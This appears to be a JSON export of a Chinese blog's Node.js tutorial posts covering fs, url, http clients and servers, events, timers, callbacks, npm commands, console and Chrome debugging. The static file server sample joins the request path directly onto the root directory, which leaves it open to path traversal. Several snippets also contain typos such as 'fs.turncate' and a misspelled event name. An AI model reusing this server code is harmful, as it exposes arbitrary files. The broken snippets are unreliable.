12fs.readdir(path, callback);fs.readdirSync(path); 删除文件 12fs.unlink(path, callbak);fs.unlinkSync(path); // 返回true/false表示成功或失败 截断文件 1fs.turncate(path, len, callback); // len 不写时为截断成零字节 建立、删除目录（同文件有区别） 12fs.mkdir(path, [mode], callback);fs.rmdir(path, callback); 重命名文件或目录 1fs.rename(oldpath, newpath, callback); 监视文件更改 1fs.watchFile(path, [options], callback); options对象有两个属性：persistent表示是否持续，true为确定，interval表示轮询时间间隔，毫秒单位下面的例子，每隔5s检测一次，输出log.txt文件的上次修改时间和本次修改时间1234fs.watchFile('log.txt', &#123;persistent: true, interval: 5000&#125;, function(curr, prev)&#123; console.log('modified at :' + curr.mtime); console.log('Previous modified at :' + prev.mtime);&#125;);","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://github.com/xmoyKING/tags/nodejs/"},{"name":"fs","slug":"fs","permalink":"https://github.com/xmoyKING/tags/fs/"}]},{"title":"Nodejs-HTTP模块","slug":"nodejs-http","date":"2016-10-28T02:32:45.000Z","updated":"2016-10-28T02:32:45.000Z","comments":true,"path":"2016/10/28/nodejs-http/","link":"","permalink":"https://github.com/xmoyKING/2016/10/28/nodejs-http/","excerpt":"","text":"Node最重要的能力就是能非常迅速的实现HTTP和HTTPS服务，node提供内置的http和https模块。http模块是底层的，不提供路由，cookie，缓存等功能。 处理URL一个URL可分解为几个不同的部分，指明了Web服务器应该如何路由和处理请求node提供了url模块，可以将一个url字符串转变为url对象1url.parse(urlStr, [parseQueryString], [salshesDenoteHost]); url.parse 将URL字符串作为第一个参数，parseQueryString 参数是一个布尔值，true表示把URL的查询字符串也解析为对象的一部分，默认为falseslashesDenoteHost 也是一个布尔值，true表示将格式为//host/path的URL解析为{host: &#39;host&#39;, pathname: &#39;path&#39;}而不是{pathname: &#39;//host/path&#39;},默认为false 也可以反转换，url.format(urlObj) 将一个URL对象转换为字符串 URL 字符串与 URL 对象：urlObject.href 完整的URL字符串urlObject.protocol 协议，小写urlObject.slashesurlObject.host 主机完整部分，包括端口，小写urlObject.auth 身份认证部分urlObject.hostname 主机部分的主机名，小写urlObject.port 主机端口号urlObject.pathname 路径部分，包括最初的斜线urlObject.search 查询字符串部分，包括前导问号？urlObject.path 完整路径，包括路径和搜索urlObject.query 要么是查询字符串的参数部分，要么是一个解析后的查询对象，取决于parseQueryString的值urlObject.hash 散列部分，包括井号#123456var url = require('url');var urlStr = 'http://user:pass@host.com:80/resource/path?query=string&amp;quer2=2#hash';var urlObj = url.parse(urlStr, true);urlString = url.format(urlObj);console.log(urlObj, urlString); 输出：Url { protocol: ‘http:’, slashes: true, auth: ‘user:pass’, host: ‘host.com:80’, port: ‘80’, hostname: ‘host.com’, hash: ‘#hash’, search: ‘?query=string&amp;quer2=2’, query: { query: ‘string’, quer2: ‘2’ }, pathname: ‘/resource/path’, path: ‘/resource/path?query=string&amp;quer2=2’, href: ‘http://user:pass@host.com:80/resource/path?query=string&amp;quer2=2#hash‘} ‘http://user:pass@host.com:80/resource/path?query=string&amp;quer2=2#hash‘ 解析URLurl模块有一个resolve方法可以用与浏览器一样的方式来解析URL的组件，即可以让服务器端操作URL字符串，并对其做出调整，比如：由于资源变动了，那么可以新添加代码在处理一个url请求之前更改url位置，而不需要对源代码做出任何修改，。1url.resolve(from, to); from指定原始基础url字符串，to指定被解析到的新url1234var url = require('url');var originalUrl = 'http://user:pass@host.com:80/resource/path?query=string&amp;quer2=2#hash';var newResource = '/another/path?querynew';console.log(url.resolve(originalUrl, newResource)); // http://user:pass@host.com:80/another/path?querynew 处理查询字符串和表单参数url.parse方法能解析url，但是没有解析query字符串，即查询字符串查询字符串和表单数据都是基本的键值对字符串，格式非常的规则，所以可以用querystring模块的parse方法将这种字符串转换为js对象1querystring.parse(str, [spe], [eq], [options]); str 为查询或参数字符串sep 可以指定使用的分隔符，默认&amp;eq 可以指定解析时使用的复制运算符，默认=options 是一个具有maxKeys属性的对象，可以限制生成对象的键的数量，即属性和方法的数量，默认为1000，设为0表示无限制123var qstring = require('querystring');var params = qstring.parse('query=string&amp;quer2=2&amp;quer3=mine&amp;name=king');console.log(params); // &#123; query: 'string', quer2: '2', quer3: 'mine', name: 'king' &#125; 以上的输出对象也可以通过querystring.stringify(obj, [sep], [eq])反转换对象为查询字符串 请求、响应、服务器对象请求和响应对象提供了信息流入/流出HTTP客户端和服务器的相关功能 http.ClientRequesthttp.request方法可以用node新建一个HTTP客户端，然后就可以如浏览器一样向一个HTTP服务器端发起http请求，当调用http.request()的时候，即会在request方法内部自动创建一个ClientRequest对象，这个对象即表示请求，可以用这个对象来启动、监控、处理来自服务器的请求。ClientRequest对象其实是一个Writable流1http.request(options,callback); options 参数对象定义了如何把客户端的HTTP请求打卡并发送到服务器，callback回调的参数是一个IncomingMessage对象，表示来自服务器的响应。 12345678910111213141516171819var http = require('http');var options = &#123; hostname: 'httpbin.org', path: '/get', port: '80', method: 'GET'&#125;;var req = http.request(options, function(response)&#123; var str = ''; response.on('data', function(chunk)&#123; str += chunk; &#125;); response.on('end', function()&#123; console.log(str); &#125;);&#125;);req.end(); 输出：{ “args”: {}, “headers”: { “Connection”: “close”, “Host”: “httpbin.org” }, “origin”: “211.86.158.25”, “url”: “http://httpbin.org/get“} 通过ClientRequest事件能，当在请求中遇到的一些状态的时候，可以进行处理 ClientRequest方法可以将数据写入请求，中止请求等 http.ServerResponse当HTTP服务器接收到一个request请求的时候，它会在内部创建一个ServerResponse对象，这个对象作为第二个参数被传递到request事件处理程序，可以通过ServerResponse将响应发还到客户端。ServerResponse也是一个Writable流，该对象提供了如下的一些属性和事件、方法： http.IncomingMessage无论是HTTP客户端还是HTTP服务器，都会创建IncomingMessage对象，表示从对应方接收到的消息（数据），它之所以能同时用在客户端和服务器是因为两端的功能基本相同，所以可以复用同一类型。IncomingMessage是一个Readable流，对象提供了如下的一些属性和事件、方法： HTTP Server对象HTTP Server对象能提供了实现HTTP服务器的基本框架，如监听端口底层套接字和接收请求，发送响应到客户端。Server对象实现了EventEmitter，并实现了如下的事件： 要启动一个HTTP服务器 先用createServer方法创建一个Server对象，1http.createServer([requestListener]); requestListener参数表示在请求事件被出发时执行的函数，接受两个参数，第一个表示客户端请求的IncomingMessage对象，第二个表示响应的ServerResponse对象 创建Server对象后，可以通过Server对象的listen方法监听1listen(port, [hostname], [backlog], [callback]); port 表示监听端口hostname 表示可接受链接的主机名，若省略则表示接受任何ipv4地址的链接backlog（积压） 表示运行排队等待链接的数量，即等待处理的请求链接数，默认511callback 表示监听开始时执行回调的函数1234567891011var http = require('http');http.createServer(function (req, res)&#123; // .... 处理请求和响应&#125;).listen(8080); // 监听8080端口// 也可以监听文件系统的连接listen(path, [callback]); // 监听文件路径listen(handle, [callback]); // 监听文件描述符// 停止监听close([callback]); HTTP客户端和服务器示例以下的示例为处理一般的http请求所需的基本流程 静态文件服务HTTP静态文件服务器12345678910111213141516171819const http = require('http');const fs = require('fs');const url = require('url');const ROOT_DIR = 'html/'; // 此处为根目录，需设定http.createServer(function (req, res)&#123; var urlObj = url.parse(req.url, true); fs.readFile(ROOT_DIR + urlObj.pathname, function(err, data)&#123; if(err)&#123; res.writeHead(404); res.end(JSON.stringify(err)); return; &#125;else&#123; res.writeHead(200); res.end(data); &#125; &#125;);&#125;).listen(8080); 在localhost:8080 即可打卡网站，然后输入对应的文件名称即可获取对应的文件，比如localhost:8080/index.html 静态HTTP客户端模拟浏览器发出http get请求，用on监听data读取服务器的响应12345678910111213141516171819const http = require('http');var options = &#123; hostname: 'localhost', port: '8000', path: '/hello.html'&#125;;function handleResponse(response)&#123; var serverData = ''; response.on('data', function(chunk)&#123; serverData += chunk; &#125;); response.on('end', function()&#123; console.log(serverData); &#125;);&#125;http.request(options, function(response)&#123; handleResponse(response);&#125;).end(); 实现动态响应服务器处理get请求的服务器12345678910111213141516const http = require('http');var message = [ 'helloworld', 'from a basic nodejs server', 'king'];http.createServer(function(req, res)&#123; res.setHeader('Content-type', 'text/html'); res.writeHead(200); res.write('&lt;html&gt;&lt;body&gt;'); for(var i in message)&#123; res.write(message[i] + '&lt;br/&gt;'); &#125; res.end('&lt;/body&gt;&lt;/html&gt;');&#125;).listen(8000); 对应的Http get客户端1234567891011121314151617181920const http = require('http');var options = &#123; hostname: 'localhost', port: '8000',&#125;;function handleResponse(response)&#123; var serverData = ''; response.on('data', function(chunk)&#123; serverData += chunk; &#125;); response.on('end', function()&#123; console.log('response status: ', response.statusCode); console.log('response headers: ', response.headers); console.log(serverData); &#125;);&#125;http.request(options, function(response)&#123; handleResponse(response);&#125;).end(); 输出：123456response status: 200response headers: &#123; 'content-type': 'text/html', date: 'Sat, 29 Apr 2017 07:05:09 GMT', connection: 'close', 'transfer-encoding': 'chunked' &#125;&lt;html&gt;&lt;body&gt;helloworld&lt;br/&gt;from a basic nodejs server&lt;br/&gt;king&lt;br/&gt;&lt;/body&gt;&lt;/html&gt; 处理post请求的服务器上面处理与get请求的示例类似1234567891011121314151617const http = require('http');http.createServer(function(req, res)&#123; var jsonData = ''; req.on('data', function(chunk)&#123; jsonData += chunk; &#125;); req.on('end', function()&#123; var reqObj = JSON.parse(jsonData); var resObj = &#123; message: 'hello ' + reqObj.name, question: 'are you a good '+ reqObj.occupation + ' ?' &#125;; res.writeHead(200); res.end(JSON.stringify(resObj)); &#125;);&#125;).listen(8000); 对应的客户端123456789101112131415161718192021222324const http = require('http');var options = &#123; hostname: 'localhost', port: '8000', path: '/', method: 'POST'&#125;;function readJSONResponse(response)&#123; var responseData = ''; response.on('data', function (chunk) &#123; responseData += chunk; &#125;); response.on('end', function()&#123; var dataObj = JSON.parse(responseData); console.log('Raw responseData: ' + responseData); console.log('Message: ' + dataObj.message); console.log('Question: ' + dataObj.question); &#125;);&#125;var req = http.request(options, readJSONResponse);req.write('&#123;\"name\":\"bob\", \"occupation\":\"teacher\"&#125;');req.end(); 输出：Raw responseData: {“message”:”hello bob”,”question”:”are you a good teacher ?”}Message: hello bobQuestion: are you a good teacher ? 与外部源交互HTTP服务常需要访问外部系统获得数据来满足客户端，这种时候就需要在Web服务器实现一个本地Web客户端连接到外部服务(这个外部服务一般是数据库，也可以是其他http服务器提供的接口)，并获得数据然后处理, 完成响应。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://github.com/xmoyKING/tags/nodejs/"},{"name":"http","slug":"http","permalink":"https://github.com/xmoyKING/tags/http/"}]},{"title":"Nodejs-事件、监听器、定时器、回调","slug":"nodejs-events","date":"2016-10-26T11:32:34.000Z","updated":"2016-10-26T11:32:34.000Z","comments":true,"path":"2016/10/26/nodejs-events/","link":"","permalink":"https://github.com/xmoyKING/2016/10/26/nodejs-events/","excerpt":"","text":"node通过事件驱动模型提供了强大的扩展性和性能，node不同于其他Web服务器采用的传统线程模型 事件模型node应用是在一个单线程的事件驱动模型中运行的，虽然node在后台实现了一个线程池，但是应用程序本身不具备多线程的概念。 比较事件回调和线程模型传统线程网络模型中，请求进入一个Web服务器，并被分配给一个可用的线程，对于该请求的处理工作继续在该线程上进行，直到请求完成并发回响应。 Node不是在各个线程为每个请求执行所有的工作，而是将工作添加到一个事件队列中，然后有一个单独的线程运行一个事件循环把这个工作提取出来。 事件循环抓取队列中最上面的任务，执行，然后抓取下一个。 当执行长期运行或有阻塞I/O的代码时，它不是直接调用该函数，而是把函数随同一个要在此函数完成执行的回调一起添加到事件队列，当node事件队列中所有的事件都被执行完成时，应用停止。 比如有两个请求：GetFile和GetData，GetFile请求打开文件读取内容，然后在响应中将数据返回，GetData请求链接数据库，查询所需数据，然后返回。 在线程模型中，这些操作都是在独立的按顺序发生的。 在事件回调方式中，node将GetFile和GetData请求添加到事件队列，然后先提取GetFile，执行，并指定Open回调函数添加到事件队列来完成它，然后提取GetData，执行，并指定Connect回调函数。这种情况直到没有任何回调函数要执行。 上图中，每个线程的事件并不完全遵守直接交错顺序。比如：Connect连接请求比Read读请求需要更长时间，所以Send()操作在Query查询之前调用。 Node中的阻塞I/O阻塞I/O停止当前线程的执行并等待回应，直到收到回应才能继续。例如： 读取文件 查询数据库 请求套接字 访问远程服务 Node使用事件回调来避免阻塞I/O，因此，执行阻塞I/O的任何请求都在后台不同的线程中执行，Node在后台实现线程池，当从队列中检索到一个I/O时，node从线程池中获取一个线程，并在线程中执行I/O操作，而不是主事件循环线程执行I/O操作，防止阻塞I/O阻碍事件队列中的其他事件。 在被阻塞的线程上执行的函数仍然可以将新的事件添加到队列中。事件循环要么在事件循环线程本身上执行操作，要么在一个单独的线程上执行操作。 线程模型必须共享CPU和资源，所以当一个线程使用CPU时，其他线程无法使用CPU。事件回调则是尽快做出响应，完全的事件驱动，同一时间可以有尽可能多的会话，同时CPU总是只关注正在进行的任务。 事件队列在队列中使用下列方法传递回调函数： 对阻塞IO调用做出回应 对内置事件如http.request和server.connection添加事件监听器 创建自定义事件发射器并对它们添加自定义监视器 使用preocess.nextTick选项来调度事件循环的下一次循环中被提取的操作 使用定时器来调度在特定时间或间隔时间后要做的 实现定时器node中有三种类型的定时器： 超时时间 setTimeout 时间间隔 setInterval 即时定时器 setImmediate 立即执行操作，在IO事件的回调函数开始执行后，比任何超时时间或时间间隔事件被执行之前, 每次调用时，回调函数被放在队列中，并在遍历事件队列循环的每次迭代中，在IO事件被调用后执行。 以上三个方法都返回该定时器对象的ID，这个ID可以用于在队列提取它之前结束定时器。 对setInterval和setTimeout对象有unref方法，unref能让队列中仅有此事件时也不会调用，即事件循环不继续，可以采用ref来重新引用。 使用nexTick调度process.nextTick能在事件循环的下一次循环中运行，nextTick在IO事件被触发之前执行，可能会导致IO事件的饥饿，node设置默认1000的process.maxTickDepth来限制事件队列的每次循环可执行的nextTick事件的数目。 1234567891011121314151617181920212223// 测试阻塞IO，定时器，nextTick的顺序, nexttick.js为本文件名称var fs = require('fs');fs.stat('nexttick.js', function(err, stats)&#123; if(stats)&#123; console.log('nexttick.js Exists'); &#125;&#125;);setImmediate(function()&#123; console.log('Immediate Timer 1');&#125;);setImmediate(function()&#123; console.log('Immediate Timer 2');&#125;);process.nextTick(function()&#123; console.log('next tick 1');&#125;);process.nextTick(function()&#123; console.log('next tick 2');&#125;); 输出：next tick 1next tick 2Immediate Timer 1Immediate Timer 2nexttick.js Exists 实现事件发射器和监听器创建自定义事件，并实现监听器和回调。 将自定义事件添加到JS对象中事件使用一个EventEmitter对象发出，这个对象包含在events模块中，emit(eventName, [args])方法出发evenName事件，包括参数 123var events = require('events');var emitter = new events.EventEmitter();emitter.emit('simpleEvent'); 将事件添加到JS对象中，可以通过在对象实例中调用events.EventEmitter.call(this)来在对象中继承EventEmitter功能，同时需要将events.EventEmitter.prototype添加到对象的原型中。 1234567Function MyObj()&#123; Events.EventEmitter.call(this);&#125;MyObj.prototype.__proto__ = events.EventEmitter.prototype;// 然后直接从对象实例中发出事件var myObj = new MyObje();myObj.emit('someEvent'); 把事件监听器添加到对象通过下列方法将监听器添加到EventEmitter对象。 addListener(eventName, callback); 将回调函数附加到对象监听器中，每当eventName事件触发，回调函数就被放在事件队列中执行。 on(eventName, callback); 同addListener once(eventName, callback); 只有eventName事件第一次接触时，回调函数才被放在事件队列中执行。12345function myCallback()&#123; ……&#125;var myObject = new MyObj();myObject.on('someEvent', myCallback); 从对象中删除监听器node在EventEmitter对象上，提供了很多辅助函数来管理包含的监听器 listeners(eventName); 返回一个连接到eventName事件的监听器函数数组 setMaxListeners(n); 若多于n个监听器加入到eventEmitter对象，就出发警报，默认为10 removeListener(eventName, callback); 将callback函数从EventEmitter对象的eventName事件中删除。 事件监听器和发射器事件示例，Account对象从EventEmitter类继承并提供两种方法，deposit（存款）和withdraw（取款），这两个方法都发出balanceChanged事件，checkGoal(acc, goal)回调函数的实现不太一样，展示了如何在事件被触发之前，将变量传递到该事件监听器函数。1234567891011121314151617181920212223242526272829303132333435363738394041var events = require('events');function Account()&#123; this.balance = 0; events.EventEmitter.call(this); this.deposit = function(amount)&#123; this.balance += amount; this.emit('balanceChanged'); &#125;; this.withdraw = function(amount)&#123; this.balance -= amount; this.emit('balanceChangded'); &#125;;&#125;Account.prototype.__proto__ = events.EventEmitter.prototype;function displayBalance()&#123; console.log('Account balance: $%d', this.balance);&#125;function checkOverdraw()&#123; if(this.balance &lt; 0)&#123; console.log('Account overdrawn!'); &#125;&#125;function checkGoal(acc, goal)&#123; if(acc.balance &gt; goal)&#123; console.log('Goal Achieved'); &#125;&#125;var account = new Account;account.on('balanceChanged', displayBalance);account.on('balanceChanged', checkOverdraw);account.on('balanceChanged', function()&#123; checkGoal(this, 1000);&#125;);account.deposit(220);account.deposit(320);account.deposit(600);account.withdraw(1200); 输出Account balance: $220Account balance: $540Account balance: $1140Goal Achieved 实现回调回调有三种具体的实现： 将参数传递给回调函数 在循环内处理回调函数参数 嵌套回调 向回调函数传递额外的参数大部分回调函数都传递给它们的自动参数，如错误或结果缓存buff，但使用回调时，常常需要从回调函数外给他们传递额外的参数，这种时候的一个方法就是，在一个匿名函数中实现该函数，然后用来自匿名函数的参数调用回调函数。 如下，有两个sawCar事件处理程序，sawCar仅发出make参数。 第一个程序实现了logCar(make)回调处理程序，在logColorCar添加颜色时，使用一个匿名函数，随机的选择一个颜色被传递到logColorCar(make, color)。1234567891011121314151617181920212223242526272829var events = require('events');function CarShow()&#123; events.EventEmitter.call(this); this.seeCar = function(make)&#123; this.emit('sawCar', make); &#125;;&#125;CarShow.prototype.__proto__ = events.EventEmitter.prototype;var show = new CarShow();function logCar(make)&#123; console.log('Saw a '+ make);&#125;function logColorCar(make, color)&#123; console.log('Saw a %s %s', color, make);&#125;show.on('sawCar', logCar);show.on('sawCar', function(make)&#123; var colors = ['red', 'blue', 'black']; var color = colors[Math.floor(Math.random()*3)]; logColorCar(make, color);&#125;);show.seeCar('Ferrai');show.seeCar('Porsche');show.seeCar('Bugatti');show.seeCar('Lamborghini');show.seeCar('Aston Martin'); 输出Saw a FerraiSaw a blue FerraiSaw a PorscheSaw a black PorscheSaw a BugattiSaw a blue BugattiSaw a LamborghiniSaw a blue LamborghiniSaw a Aston MartinSaw a blue Aston Martin 在回调中实现闭包异步回调往往与闭包有关，闭包（Closure）是一个JS术语，表示变量绑定到一个函数的作用域，但不绑定到它的父函数的作用域，当执行一个异步回调时，父函数的作用域可能修改（比如遍历并每次迭代时改变值）。 若某个回调函数需要访问父函数的作用域的变量，就需要提供闭包，使这些值在回调函数从事件队列中被提取出来时可以得到，可以在函数块内部封装一个异步调用并传入所需变量达到目的。 如下代码演示如何为logCar异步函数提供闭包的包装器函数，12345678910111213141516171819202122function logCar(logMsg, callback)&#123; process.nextTick(function()&#123; callback(logMsg); &#125;);&#125;var cars = ['Ferrari', 'Porsche', 'Bugatti'];for(var i in cars)&#123; var message = 'Saw a '+ cars[i]; logCar(message, function()&#123; console.log('Normal Callback '+ message); &#125;);&#125;for(var i in cars)&#123; var message = 'Saw a '+ cars[i]; (function(msg)&#123; logCar(msg, function()&#123; console.log('Closure Callback '+ msg); &#125;); &#125;)(message);&#125; 输出Normal Callback Saw a BugattiNormal Callback Saw a BugattiNormal Callback Saw a BugattiClosure Callback Saw a FerrariClosure Callback Saw a PorscheClosure Callback Saw a Bugatti 在这个测试中，为了使回调真正的异步，使用process.nextTick()方法来调度回调函数。 在程序中第一个for循环实现基本的回调函数，但是汽车名都是最后一个，因为每次循环迭代时，message的值都在变化。 第二个for循环实现了将消息作为msg参数传递给包装器函数，而msg的值被负载回调函数上，因此，闭包输出显示正确的消息 链式回调使用异步的时候，若两个函数都在事件队列上，则无法保证它们的运行顺序，解决问题的方法是让异步函数的回调函数去调用该函数，执行链式回调，这样异步函数永远不会在事件队列上超过一次。 如下，执行链式回调函数的例子，列表被传递到logCars中，然后异步函数logCar被调用，且logCars作为当前logCar完成时的回调函数，因此同一时间，只有一个logCar在事件队列上。1234567891011121314151617function logCar(car, callback)&#123; console.log('Saw a %s', car); if(cars.length)&#123; process.nextTick(function()&#123; callback(); &#125;); &#125;&#125;function logCars(cars)&#123; var car = cars.pop(); logCar(car, function()&#123; logCars(cars); &#125;);&#125;var cars = ['Ferrari', 'Porsche', 'Bugatti', 'Lamborghini', 'Aston Martin'];logCars(cars); 输出Saw a Aston MartinSaw a LamborghiniSaw a BugattiSaw a PorscheSaw a Ferrari","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"events","slug":"events","permalink":"https://github.com/xmoyKING/tags/events/"},{"name":"nodejs","slug":"nodejs","permalink":"https://github.com/xmoyKING/tags/nodejs/"}]},{"title":"npm常用命令及入门笔记","slug":"npm","date":"2016-10-21T01:35:30.000Z","updated":"2016-10-21T01:35:30.000Z","comments":true,"path":"2016/10/21/npm/","link":"","permalink":"https://github.com/xmoyKING/2016/10/21/npm/","excerpt":"","text":"npm help大部分情况使用install，update，uninstall即可,也使用npm help能查看npm的官方帮助：npm官方文档 常用命令：1234567891011121314151617181920212223npm install &lt;name&gt;安装nodejs的依赖包例如npm install express 就会默认安装express的最新版本，也可以通过在后面加版本号的方式安装指定版本，如npm install express@3.0.6npm install &lt;name&gt; -g 将包安装到全局环境中npm list -g --depth 0 若需要查看本机已安装的全局包：npm view &lt;name&gt; versions 查看一个包的全部版本：npm install -g 升级所有全局包npm remove &lt;name&gt; 移除npm update &lt;name&gt; 更新npm ls 列出当前安装的了所有包npm root 查看当前包的安装路径npm root -g 查看全局的包的安装路径npm help 帮助，如果要单独查看install命令的帮助，可以使用的npm help install 若使用linux，则有可能需要使用sudo执行命令。 12345# 查看npm版本号npm -v# 更新npm本身， -g表示全局安装，没有则是本地安装npm install npm -g 全局安装和本地安装的区别： 本地安装：将包安装在./node_modules下，若当前运行命令的所在目录没有node_modules文件夹则会自动新建，可以使用require([modules_name])引入本地安装的包 全局安装：将包安装在/usr/local下或node的安装目录下，可以直接在命令行中使用，也可以通过require()引入。 cnpm，更换镜像若使用npm的官方镜像比较慢，则可以选择使用淘宝的npm镜像，也使用淘宝定制的cnpm命令代替默认的npm。1234567891011# 可以考虑更换npm源，用查看源，默认为 https://registry.npmjs.org/npm config get registry# 设置为淘宝源可以比较快的安装node包npm config set registry https://registry.npm.taobao.org# 全局安装cnpm同时更新仓库镜像npm install -g cnpm --registry=https://registry.npm.taobao.org# 使用cnpm安装模块cnpm install [module name] NPM的版本号使用NPM下载和发布代码时都会接触到版本号。NPM使用语义版本号来管理代码语义版本号分为X.Y.Z三位，分别代表主版本号、次版本号和补丁版本号。当代码变更时，版本号按以下原则更新。 如果只是修复bug，需要更新Z位。 如果是新增了功能，但是向下兼容，需要更新Y位。 如果有大变动，向下不兼容，需要更新X位。版本号有了这个保证后，在申明第三方包依赖时，除了可依赖于一个固定版本号外，还可依赖于某个范围的版本号。例如”argv”: “0.0.x”表示依赖于0.0.x系列的最新版argv。 语义化版本 2.0.0 安装依赖包的版本问题NPM依赖包版本号~和^的区别及最佳实践 node.js模块依赖及版本号 遇到的一些坑关于node项目中生产的package-lock.json文件，只有npm 5以上才会有：说说 npm 5 的新坑","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://github.com/xmoyKING/tags/npm/"}]},{"title":"Nodejs-console模块","slug":"nodejs-console","date":"2016-09-26T11:14:37.000Z","updated":"2016-09-26T11:14:37.000Z","comments":true,"path":"2016/09/26/nodejs-console/","link":"","permalink":"https://github.com/xmoyKING/2016/09/26/nodejs-console/","excerpt":"","text":"console（控制台）模块是Node最有用（常用）的模块之一，该模块提供了大量的功能，同来把调试和信息内容写到控制台。console模块能控制输出，实现时间差的输出，并把跟踪信息和断言写到控制台。console模块并不需要使用require()语句就能把它加载到模块中,只需要使用console.xxx()即可调用xxx方法。 console的一些常用函数： log([data], [……]): 将data输出到控制台，data变量可以是字符串或者可解析为字符串的一个对象，额外的参数也可以被发送。 1console.log('There are %d items', 5); // There are 5 items info(): 与log类似 error(): 与log类似，其中error输出也被发送到stderr warn(): 与error类似 dir(obj): 把一个JS对象的字符串表示形式写到控制台 1console.dir(&#123;name: 'king', role: 'author'&#125;); // &#123;name: 'king', role: 'author'&#125; time(label): 把一个精度为毫秒的当前时间戳赋给字符串label timeEnd(label): 创建当前时间与赋给label的时间戳之间的差值，并输出结果， 123console.time('FileWriter');f.write(data); // 大约用时500msconsole.timeEnd('FileWriter'); // FileWriter: 500ms trace(label): 把代码当前位置的栈跟踪信息写到stderr 12345678910111213module.trace('tracer');// 输出栈跟踪信息:Trace: tracer at Object.&lt;anonymous&gt; (E:\\Git\\xmoyKing.github.io\\Untitled-1.txt.js:1:71) at Module._compile (module.js:570:32) at Object.Module._extensions..js (module.js:579:10) at Module.load (module.js:487:32) at tryModuleLoad (module.js:446:12) at Function.Module._load (module.js:438:3) at Module.runMain (module.js:604:10) at run (bootstrap_node.js:394:7) at startup (bootstrap_node.js:149:9) at bootstrap_node.js:509:3 assert(expression, {message}): 如果expression计算结果为false，就把消息和栈跟踪信息写到控制台","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://github.com/xmoyKING/tags/nodejs/"},{"name":"console","slug":"console","permalink":"https://github.com/xmoyKING/tags/console/"}]},{"title":"前端调试Debug","slug":"debug","date":"2016-09-24T07:58:06.000Z","updated":"2017-12-06T14:50:08.946Z","comments":true,"path":"2016/09/24/debug/","link":"","permalink":"https://github.com/xmoyKING/2016/09/24/debug/","excerpt":"","text":"前端调试的一些技巧和知识点，主要基于chrome开发者调试面板 断点及捕获事件绑定断点Resource存储一些离线的资源, 在source面板找到源代码，然后在行标处点击即可打上断点，点击运行即可执行调试，具体可以通过一些快捷键执行一步一步调试等 寻找事件监听通过Event Listeners可以查看到按钮的绑定事件，但是若是通过jQuery库绑定的事件的话，就会无法找到具体的事件源代码，只能看到包装后的事件，而点击源代码位置却是直接跳转到jquery.js中。 DOM元素断点在元素Dom结构上，右键具体标签，弹出的Break on中的三个事件中能狗监听原始的属性改变事件，子标签改变事件以及元素的移除事件。 Audits和Chrome性能插件通过Audits面板，能帮助分析网站，同时得到优化的建议 performanceTracer插件能将performance.timing API的结果以可视化的方式展示出来，更方便好看 Page Speed插件比Tracer更详细更强大一些，也能帮助分析优化点 在性能优化方面，需要能看懂performance.timing以及以下图谱 通过Timeline分析帧渲染模式当网页动画能达到60帧时，就能跟显示器同步刷新，即每次重新渲染的时间不能超过16.66ms，这样效率最高 在Timeline中，饼状图中的不同颜色代表不同的阶段（操作） 蓝色：网络通信和HTML解析 黄色：Javascript执行 紫色：样式计算和布局，即重排 绿色：重绘 在帧的渲染模式中：window.requestAnimationFrame() 在下一帧进行渲染时执行window.requestIdleCallback() 在下几次重新渲染时执行 触发分层： 获取DOM并将其分割为多个层 将每个层独立的绘制进位图中 将层作为纹理上传至GPU 复合多个层来生成最终的屏幕图像 在面板中打开Rendering，然后勾选Enable paint Flashing, Show layer borders 可以对层做出检测和分析 在Firefox面板中通过3DView能方便的查看layer（橘黄色），绿色框为重绘时触发 网页生成时，至少会渲染一次，在访问时还会不断重新渲染，以下三种情况一定会导致网页重新渲染： 修改DOM 修改样式表 触发用户事件 重新渲染中，若需要重新生成布局（即重排），然后再重新绘制（重绘），重绘不一定需要重排，比如修改某元素的颜色，则只会出发重绘，因为布局不变，但是重排一定会重绘。 开发中关于重排重绘的知识点： 样式越简单，重排重绘越快 重排和重绘的DOM元素层级越深，成本越高 table元素的重排和重绘成本高于div 尽量不要把读和写操作放在一个语句中（即先读取属性数值再统一写入） 统一改变样式，即直接改变css class而不是操作属性 缓存重排结果（不知道如何缓存这个结果，有可能是缓存dom结构） 离线DOM fragment/clone 虚拟DOM React 将不可见的元素设置为display:none不影响重排和重绘，visibility影响重绘而不影响重排 通过Profiles分析具体问题在Profiles面板，用Collect Javascript CPU Profiles选项结合node-inspector能检测Nodejs内存泄漏问题。 node-inspector能通过chrome调试node代码 引起Nodejs内存泄漏的原因有： 全局变量需要进程退出才能释放 闭包引用中间函数，中间函数也不会释放，会使原始的作用域也不会释放，作用域不被释放，它产生的内存占用也不会被释放，所以使用过后需要重置为Null等待GC 谨慎使用内存当做缓存，建议采用Redis或者Memcached，好处：外部缓存软件有良好缓存过期淘汰策略，以及自由的内存管理，不影响Node主进程性能，减少内部常驻内存的对象数量垃圾回收更高效率，进程间共享缓存。","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"debug","slug":"debug","permalink":"https://github.com/xmoyKING/tags/debug/"},{"name":"chrome","slug":"chrome","permalink":"https://github.com/xmoyKING/tags/chrome/"}]},{"title":"JavaScript高级程序设计-26-最佳实践","slug":"js-pro26","date":"2016-09-20T05:49:47.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/09/20/js-pro26/","link":"","permalink":"https://github.com/xmoyKING/2016/09/20/js-pro26/","excerpt":"","text":"js的最佳实践分成若干类，在开发过程的不同阶段上应用。 可维护性复杂Web应用有成千上万行js，执行各种复杂功能。这不得不使开发者考虑可维护性问题。 编写可维护的代码很重要，因为大部分开发人员都花费大量时间维护他人代码，很难从头开始开发新代码，很多情况下是以他人的工作成果为基础的，确保自己的代码的可维护性，以便其他开发人员在此基础上更好的开展工作。 可维护的代码概念可以广泛应用在各种编程语言上，不仅仅是js。 